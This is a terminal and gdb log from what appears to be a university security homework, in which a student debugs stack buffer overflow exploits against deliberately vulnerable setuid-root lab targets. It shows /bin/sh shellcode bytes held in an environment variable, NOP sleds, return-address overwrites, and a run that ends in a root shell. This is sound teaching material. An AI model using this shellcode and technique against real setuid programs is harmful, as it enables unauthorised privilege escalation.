0xbfffff38:	0x00000020	0x00000005	0x00000009	0x00000007
0xbfffff48:	0xb7fdb000	0x00000008	0x00000000	0x00000009
0xbfffff58:	0x080483a0	0x0000000b	0x000003e8	0x0000000c
0xbfffff68:	0x000003e8	0x0000000d	0x000003e8	0x0000000e
0xbfffff78:	0x000003e8	0x00000017	0x00000001	0x00000019
0xbfffff88:	0xbfffffbb	0x0000001a	0x00000000	0x0000001f
0xbfffff98:	0xbfffffef	0x0000000f	0xbfffffcb	0x00000000
0xbfffffa8:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffffb8:	0xca000000	0x91b18d34	0x045fbe98	0x6bfed0a8
0xbfffffc8:	0x6972ec96	0x00363836	0x00000000	0x6d742f00
0xbfffffd8:	0x61742f70	0x74656772	0x90900031	0x90909090
0xbfffffe8:	0x90909090	0x2f009090	0x2f706d74	0x67726174
0xbffffff8:	0x00317465	0x00000000	Cannot access memory at address 0xc0000000
(gdb) p &argv
$1 = (char ***) 0xbffffe64
(gdb) x/x 0xbffffe64
0xbffffe64:	0xbffffef4
(gdb) x/32x 0xbffffe64-32
0xbffffe44:	0x08048210	0x08048509	0x00000000	0xb7fbb000
0xbffffe54:	0xb7fbb000	0x00000000	0xb7e21637	0x00000002
0xbffffe64:	0xbffffef4	0xbfffff00	0x00000000	0x00000000
0xbffffe74:	0x00000000	0xb7fbb000	0xb7fffc04	0xb7fff000
0xbffffe84:	0x00000000	0xb7fbb000	0xb7fbb000	0x00000000
0xbffffe94:	0x82cde3c0	0xb91acdd0	0x00000000	0x00000000
0xbffffea4:	0x00000000	0x00000002	0x080483a0	0x00000000
0xbffffeb4:	0xb7ff0010	0xb7fea880	0xb7fff000	0x00000002
(gdb) x/32x 0xbffffef4-32
0xbffffed4:	0x00000002	0xbffffef4	0x08048500	0x08048560
0xbffffee4:	0xb7fea880	0xbffffeec	0xb7fff918	0x00000002
0xbffffef4:	0xbfffffd5	0xbfffffe2	0x00000000	0x00000000
0xbfffff04:	0x00000020	0xb7fd9cec	0x00000021	0xb7fd9000
0xbfffff14:	0x00000010	0x178bfbff	0x00000006	0x00001000
0xbfffff24:	0x00000011	0x00000064	0x00000003	0x08048034
0xbfffff34:	0x00000004	0x00000020	0x00000005	0x00000009
0xbfffff44:	0x00000007	0xb7fdb000	0x00000008	0x00000000
(gdb) p &argv[1]
$2 = (char **) 0xbffffef8
(gdb) x/32x 0xbffffef8-32
0xbffffed8:	0xbffffef4	0x08048500	0x08048560	0xb7fea880
0xbffffee8:	0xbffffeec	0xb7fff918	0x00000002	0xbfffffd5
0xbffffef8:	0xbfffffe2	0x00000000	0x00000000	0x00000020
0xbfffff08:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
0xbfffff18:	0x178bfbff	0x00000006	0x00001000	0x00000011
0xbfffff28:	0x00000064	0x00000003	0x08048034	0x00000004
0xbfffff38:	0x00000020	0x00000005	0x00000009	0x00000007
0xbfffff48:	0xb7fdb000	0x00000008	0x00000000	0x00000009
(gdb) x/32x 0xbffffef8+32
0xbfffff18:	0x178bfbff	0x00000006	0x00001000	0x00000011
0xbfffff28:	0x00000064	0x00000003	0x08048034	0x00000004
0xbfffff38:	0x00000020	0x00000005	0x00000009	0x00000007
0xbfffff48:	0xb7fdb000	0x00000008	0x00000000	0x00000009
0xbfffff58:	0x080483a0	0x0000000b	0x000003e8	0x0000000c
0xbfffff68:	0x000003e8	0x0000000d	0x000003e8	0x0000000e
0xbfffff78:	0x000003e8	0x00000017	0x00000001	0x00000019
0xbfffff88:	0xbfffffbb	0x0000001a	0x00000000	0x0000001f
(gdb) x/x 0xbffffef8
0xbffffef8:	0xbfffffe2
(gdb) info frame
Stack level 0, frame at 0xbffffe60:
 eip = 0x80484b8 in main (target1.c:16); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffffe58, args: argc=2, argv=0xbffffef4
 Locals at 0xbffffe58, Previous frame's sp is 0xbffffe60
 Saved registers:
  ebp at 0xbffffe58, eip at 0xbffffe5c
(gdb) q
A debugging session is active.

	Inferior 1 [process 1610] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit1.c -o sploit1
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit1
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit1
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit1.c -o sploit1
sploit1.c: In function ‘main’:
sploit1.c:38:38: error: ‘sled_length’ undeclared (first use in this function)
   char *result = malloc(sizeof(noop)*sled_length + sizeof(address) + 1);
                                      ^
sploit1.c:38:38: note: each undeclared identifier is reported only once for each function it appears in
sploit1.c:38:59: error: ‘address’ undeclared (first use in this function)
   char *result = malloc(sizeof(noop)*sled_length + sizeof(address) + 1);
                                                           ^
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit1.c -o sploit1
sploit1.c: In function ‘main’:
sploit1.c:39:38: error: ‘sled_length’ undeclared (first use in this function)
   char *result = malloc(sizeof(noop)*sled_length + sizeof(address) + 1);
                                      ^
sploit1.c:39:38: note: each undeclared identifier is reported only once for each function it appears in
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit1.c -o sploit1
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit1
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit1
Reading symbols from sploit1...done.
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit1.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit1 

Breakpoint 1, main () at sploit1.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1827 is executing new program: /tmp/target1

Breakpoint 1, main (argc=2, argv=0xbffffea4) at target1.c:16
16	  if( argc != 2 )
(gdb) info frame
Stack level 0, frame at 0xbffffe10:
 eip = 0x80484b8 in main (target1.c:16); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffffe08, args: argc=2, argv=0xbffffea4
 Locals at 0xbffffe08, Previous frame's sp is 0xbffffe10
 Saved registers:
  ebp at 0xbffffe08, eip at 0xbffffe0c
(gdb) x/x $ebp
0xbffffe08:	0x00000000
(gdb) x/64x 0xbffffe08-32
0xbffffde8:	0xbffffeb0	0x08048521	0xb7fbb3dc	0x08048210
0xbffffdf8:	0x08048509	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe08:	0x00000000	0xb7e21637	0x00000002	0xbffffea4
0xbffffe18:	0xbffffeb0	0x00000000	0x00000000	0x00000000
0xbffffe28:	0xb7fbb000	0xb7fffc04	0xb7fff000	0x00000000
0xbffffe38:	0xb7fbb000	0xb7fbb000	0x00000000	0x524031f6
0xbffffe48:	0x6997ffe6	0x00000000	0x00000000	0x00000000
0xbffffe58:	0x00000002	0x080483a0	0x00000000	0xb7ff0010
0xbffffe68:	0xb7fea880	0xb7fff000	0x00000002	0x080483a0
0xbffffe78:	0x00000000	0x080483c1	0x080484b5	0x00000002
0xbffffe88:	0xbffffea4	0x08048500	0x08048560	0xb7fea880
0xbffffe98:	0xbffffe9c	0xb7fff918	0x00000002	0xbfffff87
0xbffffea8:	0xbfffff94	0x00000000	0xbfffff9b	0xbfffffdb
0xbffffeb8:	0xbfffffe8	0x00000000	0x00000020	0xb7fd9cec
0xbffffec8:	0x00000021	0xb7fd9000	0x00000010	0x178bfbff
0xbffffed8:	0x00000006	0x00001000	0x00000011	0x00000064
(gdb) p &getenv("PATH")
Attempt to take address of value not located in memory.
(gdb) p &getenv("shellcode")
Attempt to take address of value not located in memory.
(gdb) p getenv("shellcode")
$1 = -1073741915
(gdb) p getenv("shellcod")
$2 = 0
(gdb) p getenv("shellcd")
$3 = 0
(gdb) p/x getenv("sh")
$4 = 0x0
(gdb) p/x getenv("shee")
$5 = 0x0
(gdb) p/x getenv("shellcode")
$6 = 0xbfffffa5
(gdb) q
A debugging session is active.

	Inferior 1 [process 1827] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit1.c -o sploit1
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit1
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit1.c -o sploit1
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit1
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit1
Reading symbols from sploit1...done.
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit1.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit1 

Breakpoint 1, main () at sploit1.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1913 is executing new program: /tmp/target1

Breakpoint 1, main (argc=2, argv=0xbffffea4) at target1.c:16
16	  if( argc != 2 )
(gdb) p/x  getenv("shellcode")
$1 = 0xbfffffa3
(gdb) x/32x 0xbfffffa3-32
0xbfffff83:	0x706d742f	0x7261742f	0x31746567	0x90909000
0xbfffff93:	0xffffa590	0x687300bf	0x636c6c65	0x3d65646f
0xbfffffa3:	0xdb31c031	0x80cd17b0	0x895e1feb	0xc0310876
0xbfffffb3:	0x89074688	0x0bb00c46	0x4e8df389	0x0c568d08
0xbfffffc3:	0xdb3180cd	0xcd40d889	0xffdce880	0x622fffff
0xbfffffd3:	0x732f6e69	0x742f0068	0x742f706d	0x65677261
0xbfffffe3:	0x90003174	0xa5909090	0x00bfffff	0x706d742f
0xbffffff3:	0x7261742f	0x31746567	0x00000000	Cannot access memory at address 0xc0000000
(gdb) q
A debugging session is active.

	Inferior 1 [process 1913] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit1.c -o sploit1
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit1
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit1
Reading symbols from sploit1...done.
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit1.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit1 

Breakpoint 1, main () at sploit1.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1963 is executing new program: /tmp/target1

Breakpoint 1, main (argc=2, argv=0xbffffea4) at target1.c:16
16	  if( argc != 2 )
(gdb) info frame
Stack level 0, frame at 0xbffffe10:
 eip = 0x80484b8 in main (target1.c:16); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffffe08, args: argc=2, argv=0xbffffea4
 Locals at 0xbffffe08, Previous frame's sp is 0xbffffe10
 Saved registers:
  ebp at 0xbffffe08, eip at 0xbffffe0c
(gdb) b 10
Breakpoint 3 at 0x80484a1: file target1.c, line 10.
(gdb) continue
Continuing.

Breakpoint 3, foo (temp=0xbfffff90 "\220\220\220\220\243\377\377\277") at target1.c:10
10	  strncpy(name, temp, 12);
(gdb) info frame
Stack level 0, frame at 0xbffffe04:
 eip = 0x80484a1 in foo (target1.c:10); saved eip = 0x80484ea
 called by frame at 0xbffffe10
 source language c.
 Arglist at 0xbffffdfc, args: temp=0xbfffff90 "\220\220\220\220\243\377\377\277"
 Locals at 0xbffffdfc, Previous frame's sp is 0xbffffe04
 Saved registers:
  ebp at 0xbffffdfc, eip at 0xbffffe00
(gdb) p/x getenv("shellcode")
$1 = 0xbfffffa3
(gdb) x/64x 0xbfffffa3-32 
0xbfffff83:	0x706d742f	0x7261742f	0x31746567	0x90909000
0xbfffff93:	0xffffa390	0x687300bf	0x636c6c65	0x3d65646f
0xbfffffa3:	0xdb31c031	0x80cd17b0	0x895e1feb	0xc0310876
0xbfffffb3:	0x89074688	0x0bb00c46	0x4e8df389	0x0c568d08
0xbfffffc3:	0xdb3180cd	0xcd40d889	0xffdce880	0x622fffff
0xbfffffd3:	0x732f6e69	0x742f0068	0x742f706d	0x65677261
0xbfffffe3:	0x90003174	0xa3909090	0x00bfffff	0x706d742f
0xbffffff3:	0x7261742f	0x31746567	0x00000000	Cannot access memory at address 0xc0000000
(gdb) x/x $eip
0x80484a1 <foo+6>:	0x75ff0c6a
(gdb) info frame
Stack level 0, frame at 0xbffffe04:
 eip = 0x80484a1 in foo (target1.c:10); saved eip = 0x80484ea
 called by frame at 0xbffffe10
 source language c.
 Arglist at 0xbffffdfc, args: temp=0xbfffff90 "\220\220\220\220\243\377\377\277"
 Locals at 0xbffffdfc, Previous frame's sp is 0xbffffe04
 Saved registers:
  ebp at 0xbffffdfc, eip at 0xbffffe00
(gdb) x/64x 0xbffffe00-32
0xbffffde0:	0x00000002	0xbffffea4	0xbffffeb0	0xcc048521
0xbffffdf0:	0xb7fbb3dc	0x08048210	0x08048509	0xbffffe08
0xbffffe00:	0x080484ea	0xbfffff90	0x00000000	0xb7e21637
0xbffffe10:	0x00000002	0xbffffea4	0xbffffeb0	0x00000000
0xbffffe20:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe30:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe40:	0x00000000	0x7ac2af78	0x41156168	0x00000000
0xbffffe50:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffe60:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
0xbffffe70:	0x00000002	0x080483a0	0x00000000	0x080483c1
0xbffffe80:	0x080484b5	0x00000002	0xbffffea4	0x08048500
0xbffffe90:	0x08048560	0xb7fea880	0xbffffe9c	0xb7fff918
0xbffffea0:	0x00000002	0xbfffff83	0xbfffff90	0x00000000
0xbffffeb0:	0xbfffff99	0xbfffffd9	0xbfffffe6	0x00000000
0xbffffec0:	0x00000020	0xb7fd9cec	0x00000021	0xb7fd9000
0xbffffed0:	0x00000010	0x178bfbff	0x00000006	0x00001000
(gdb) n
11	}
(gdb) info frame
Stack level 0, frame at 0xbffffe04:
 eip = 0x80484b2 in foo (target1.c:11); saved eip = 0x0
 called by frame at 0xbffffe08
 source language c.
 Arglist at 0xbffffdfc, args: temp=0xbfffff90 "\220\220\220\220\243\377\377\277"
 Locals at 0xbffffdfc, Previous frame's sp is 0xbffffe04
 Saved registers:
  ebp at 0xbffffdfc, eip at 0xbffffe00
(gdb) x/64x 0xbffffe00-32
0xbffffde0:	0xb7fbb000	0x00000000	0x080484af	0xbffffdf8
0xbffffdf0:	0xbfffff90	0x0000000c	0x90909090	0xbfffffa3
0xbffffe00:	0x00000000	0xbfffff90	0x00000000	0xb7e21637
0xbffffe10:	0x00000002	0xbffffea4	0xbffffeb0	0x00000000
0xbffffe20:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe30:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe40:	0x00000000	0x7ac2af78	0x41156168	0x00000000
0xbffffe50:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffe60:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
0xbffffe70:	0x00000002	0x080483a0	0x00000000	0x080483c1
0xbffffe80:	0x080484b5	0x00000002	0xbffffea4	0x08048500
0xbffffe90:	0x08048560	0xb7fea880	0xbffffe9c	0xb7fff918
0xbffffea0:	0x00000002	0xbfffff83	0xbfffff90	0x00000000
0xbffffeb0:	0xbfffff99	0xbfffffd9	0xbfffffe6	0x00000000
0xbffffec0:	0x00000020	0xb7fd9cec	0x00000021	0xb7fd9000
0xbffffed0:	0x00000010	0x178bfbff	0x00000006	0x00001000
(gdb) q
A debugging session is active.

	Inferior 1 [process 1963] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit1.c -o sploit1
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit1
$ whoami
student
$ su root
Password: 
^Csu: Authentication failure
$ exit
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls -la /tmp
total 104
drwxrwxrwt 10 root root 4096 Nov 29 13:27 .
drwxr-xr-x 23 root root 4096 Nov 26 10:57 ..
drwxrwxrwt  2 root root 4096 Nov 29 12:07 .font-unix
drwxrwxrwt  2 root root 4096 Nov 29 12:07 .ICE-unix
drwx------  3 root root 4096 Nov 29 12:07 systemd-private-83c760b6b65f421da74b4a96d8d02474-colord.service-Riqfw0
drwx------  3 root root 4096 Nov 29 12:07 systemd-private-83c760b6b65f421da74b4a96d8d02474-rtkit-daemon.service-VNs6tE
drwx------  3 root root 4096 Nov 29 12:07 systemd-private-83c760b6b65f421da74b4a96d8d02474-systemd-timesyncd.service-1xctiQ
-rwsr-xr-x  1 root root 8580 Nov 29 12:20 target0
-rwsr-xr-x  1 root root 9748 Nov 29 12:20 target1
-rwsr-xr-x  1 root root 9964 Nov 29 12:20 target2
-rwsr-xr-x  1 root root 9852 Nov 29 12:20 target3
-rwsr-xr-x  1 root root 9744 Nov 29 12:20 target4
drwxrwxrwt  2 root root 4096 Nov 29 12:07 .Test-unix
-r--r--r--  1 root root   11 Nov 29 12:07 .X0-lock
drwxrwxrwt  2 root root 4096 Nov 29 12:07 .X11-unix
drwxrwxrwt  2 root root 4096 Nov 29 12:07 .XIM-unix
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ sudo make^C
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ cd ../targets
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ sudo make
[sudo] password for student: 
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target0 target0.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target1 target1.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target2 target2.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target3 target3.c
gcc -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -o target4 target4.c
install -o root -t /tmp target0 target1 target2 target3 target4
chmod 4755 /tmp/target*
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ../sploits1
-bash: cd: ../sploits1: No such file or directory
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ../sploits
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit1.c -o sploit1
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0  sploit0.c  sploit1  sploit1.c  sploit2.c  sploit3.c  sploit4.c  sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit1.c -o sploit1; echo whoami | ./sploit1
student
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit0.c -o sploit0; echo whoami | ./sploit0
Hi ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
   ?
    ???V
        ̀1ۉ?@̀?????/bin/sh,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???,???
root
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls -la
total 60
drwxr-xr-x 2 student student  4096 Nov 29 13:37 .
drwxr-xr-x 6 student student  4096 Nov 26 10:49 ..
-rwxr-xr-x 1 student student   475 Nov 26 10:49 shellcode.h
-rwxrwxr-x 1 student student 10316 Nov 29 13:37 sploit0
-rw-r--r-- 1 student student  1089 Nov 27 20:20 sploit0.c
-rwxrwxr-x 1 student student 10340 Nov 29 13:36 sploit1
-rw-r--r-- 1 student student  1015 Nov 29 13:35 sploit1.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploit2.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploit3.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploit4.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls -la /tmp
total 104
drwxrwxrwt 10 root root 4096 Nov 29 13:37 .
drwxr-xr-x 23 root root 4096 Nov 26 10:57 ..
drwxrwxrwt  2 root root 4096 Nov 29 12:07 .font-unix
drwxrwxrwt  2 root root 4096 Nov 29 12:07 .ICE-unix
drwx------  3 root root 4096 Nov 29 12:07 systemd-private-83c760b6b65f421da74b4a96d8d02474-colord.service-Riqfw0
drwx------  3 root root 4096 Nov 29 12:07 systemd-private-83c760b6b65f421da74b4a96d8d02474-rtkit-daemon.service-VNs6tE
drwx------  3 root root 4096 Nov 29 12:07 systemd-private-83c760b6b65f421da74b4a96d8d02474-systemd-timesyncd.service-1xctiQ
-rwsr-xr-x  1 root root 8580 Nov 29 13:35 target0
-rwsr-xr-x  1 root root 9748 Nov 29 13:35 target1
-rwsr-xr-x  1 root root 9964 Nov 29 13:35 target2
-rwsr-xr-x  1 root root 9852 Nov 29 13:35 target3
-rwsr-xr-x  1 root root 9744 Nov 29 13:35 target4
drwxrwxrwt  2 root root 4096 Nov 29 12:07 .Test-unix
-r--r--r--  1 root root   11 Nov 29 12:07 .X0-lock
drwxrwxrwt  2 root root 4096 Nov 29 12:07 .X11-unix
drwxrwxrwt  2 root root 4096 Nov 29 12:07 .XIM-unix
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ cd ../targets
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cat Makefile 
CC := gcc
RM := rm -f
EXECSTACK := execstack

# flags
CFLAGSEXEC := -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector
CFLAGSNOEXEC := -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector

# sources
sources := target0.c target1.c target2.c target3.c  target4.c
targets := target0 target1 target2 target3 target4

# gmake magic
.PHONY: all clean

#targets
all: 
	$(CC) $(CFLAGSEXEC) -o target0 target0.c
	$(CC) $(CFLAGSEXEC) -o target1 target1.c
	$(CC) $(CFLAGSEXEC) -o target2 target2.c
	$(CC) $(CFLAGSEXEC) -o target3 target3.c
	$(CC) $(CFLAGSNOEXEC) -o target4 target4.c
	install -o root -t /tmp $(targets)
	chmod 4755 /tmp/target*

clean:
	$(RM) $(targets) $(sources:.c=.o)
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ../sploits/
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit1.c -o sploit1; echo whoami | ./sploit1
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit1.c -o sploit1; echo whoami | ./sploit1
student
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit1.c -o sploit1; echo whoami | sudo ./sploit1
[sudo] password for student: 
root
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit1.c -o sploit1; echo whoami | ./sploit1
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit1.c -o sploit1; echo whoami | ./sploit1
student
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit1
Reading symbols from sploit1...done.
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit1.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit1 

Breakpoint 1, main () at sploit1.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 2306 is executing new program: /tmp/target1

Breakpoint 1, main (argc=2, argv=0xbffffe94) at target1.c:16
16	  if( argc != 2 )
(gdb) info frame
Stack level 0, frame at 0xbffffe00:
 eip = 0x80484b8 in main (target1.c:16); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffffdf8, args: argc=2, argv=0xbffffe94
 Locals at 0xbffffdf8, Previous frame's sp is 0xbffffe00
 Saved registers:
  ebp at 0xbffffdf8, eip at 0xbffffdfc
(gdb) break 10
Breakpoint 3 at 0x80484a1: file target1.c, line 10.
(gdb) c
Continuing.

Breakpoint 3, foo (temp=0xbfffff80 "\220\220\220\220\220\220\220\220\243\377\377\277") at target1.c:10
10	  strncpy(name, temp, 12);
(gdb) info frame
Stack level 0, frame at 0xbffffdf4:
 eip = 0x80484a1 in foo (target1.c:10); saved eip = 0x80484ea
 called by frame at 0xbffffe00
 source language c.
 Arglist at 0xbffffdec, args: temp=0xbfffff80 "\220\220\220\220\220\220\220\220\243\377\377\277"
 Locals at 0xbffffdec, Previous frame's sp is 0xbffffdf4
 Saved registers:
  ebp at 0xbffffdec, eip at 0xbffffdf0
(gdb) x/64x 0xbffffdf4-32
0xbffffdd4:	0xbffffe94	0xbffffea0	0x08048521	0xb7fbb3dc
0xbffffde4:	0x08048210	0x08048509	0xbffffdf8	0x080484ea
0xbffffdf4:	0xbfffff80	0x00000000	0xb7e21637	0x00000002
0xbffffe04:	0xbffffe94	0xbffffea0	0x00000000	0x00000000
0xbffffe14:	0x00000000	0xb7fbb000	0xb7fffc04	0xb7fff000
0xbffffe24:	0x00000000	0xb7fbb000	0xb7fbb000	0x00000000
0xbffffe34:	0xae4c51dc	0x959bbfcc	0x00000000	0x00000000
0xbffffe44:	0x00000000	0x00000002	0x080483a0	0x00000000
0xbffffe54:	0xb7ff0010	0xb7fea880	0xb7fff000	0x00000002
0xbffffe64:	0x080483a0	0x00000000	0x080483c1	0x080484b5
0xbffffe74:	0x00000002	0xbffffe94	0x08048500	0x08048560
0xbffffe84:	0xb7fea880	0xbffffe8c	0xb7fff918	0x00000002
0xbffffe94:	0xbfffff73	0xbfffff80	0x00000000	0xbfffff8d
0xbffffea4:	0xbfffffd5	0xbfffffe2	0x00000000	0x00000020
0xbffffeb4:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
0xbffffec4:	0x178bfbff	0x00000006	0x00001000	0x00000011
(gdb) n
11	}
(gdb) x/64x 0xbffffdf4-32
0xbffffdd4:	0x00000000	0x080484af	0xbffffde8	0xbfffff80
0xbffffde4:	0x0000000c	0x90909090	0x90909090	0xbfffffa3
0xbffffdf4:	0xbfffff80	0x00000000	0xb7e21637	0x00000002
0xbffffe04:	0xbffffe94	0xbffffea0	0x00000000	0x00000000
0xbffffe14:	0x00000000	0xb7fbb000	0xb7fffc04	0xb7fff000
0xbffffe24:	0x00000000	0xb7fbb000	0xb7fbb000	0x00000000
0xbffffe34:	0xae4c51dc	0x959bbfcc	0x00000000	0x00000000
0xbffffe44:	0x00000000	0x00000002	0x080483a0	0x00000000
0xbffffe54:	0xb7ff0010	0xb7fea880	0xb7fff000	0x00000002
0xbffffe64:	0x080483a0	0x00000000	0x080483c1	0x080484b5
0xbffffe74:	0x00000002	0xbffffe94	0x08048500	0x08048560
0xbffffe84:	0xb7fea880	0xbffffe8c	0xb7fff918	0x00000002
0xbffffe94:	0xbfffff73	0xbfffff80	0x00000000	0xbfffff8d
0xbffffea4:	0xbfffffd5	0xbfffffe2	0x00000000	0x00000020
0xbffffeb4:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
0xbffffec4:	0x178bfbff	0x00000006	0x00001000	0x00000011
(gdb) x/64x 0xbffffdf0-32
0xbffffdd0:	0xb7fbb000	0x00000000	0x080484af	0xbffffde8
0xbffffde0:	0xbfffff80	0x0000000c	0x90909090	0x90909090
0xbffffdf0:	0xbfffffa3	0xbfffff80	0x00000000	0xb7e21637
0xbffffe00:	0x00000002	0xbffffe94	0xbffffea0	0x00000000
0xbffffe10:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe20:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe30:	0x00000000	0xae4c51dc	0x959bbfcc	0x00000000
0xbffffe40:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffffe50:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
0xbffffe60:	0x00000002	0x080483a0	0x00000000	0x080483c1
0xbffffe70:	0x080484b5	0x00000002	0xbffffe94	0x08048500
0xbffffe80:	0x08048560	0xb7fea880	0xbffffe8c	0xb7fff918
0xbffffe90:	0x00000002	0xbfffff73	0xbfffff80	0x00000000
0xbffffea0:	0xbfffff8d	0xbfffffd5	0xbfffffe2	0x00000000
0xbffffeb0:	0x00000020	0xb7fd9cec	0x00000021	0xb7fd9000
